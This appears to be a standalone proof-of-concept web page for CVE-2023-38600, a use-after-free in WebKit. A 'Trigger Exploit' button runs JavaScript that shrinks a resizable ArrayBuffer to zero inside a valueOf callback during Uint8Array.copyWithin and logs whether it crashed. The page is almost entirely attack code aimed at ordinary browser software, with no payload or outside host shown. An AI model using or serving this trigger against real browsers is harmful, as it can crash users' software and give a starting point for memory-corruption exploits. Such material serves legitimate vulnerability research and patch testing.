<body>
  <h1>CVE-2023-38600 - WebKit UAF</h1>
  <button onclick="trigger()">Trigger Exploit</button>
  <pre id="log"></pre>

  <script>
    function log(msg) {
      document.getElementById('log').textContent += msg + "\n";
    }

    function trigger() {
      log("[*] Starting CVE-2023-38600 test...");

      const ab = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
      const u8 = new Uint8Array(ab);

      const callback = () => {
        ab.resize(0);
        log("[*] Buffer resized to 0 inside valueOf()");
        return 0;
      };

      try {
        u8.copyWithin(0x20, { valueOf: callback });
        log("[+] copyWithin executed (check debugger or crash handler)");
      } catch (e) {
        log("[-] Exception: " + e);
      }
    }
  </script>
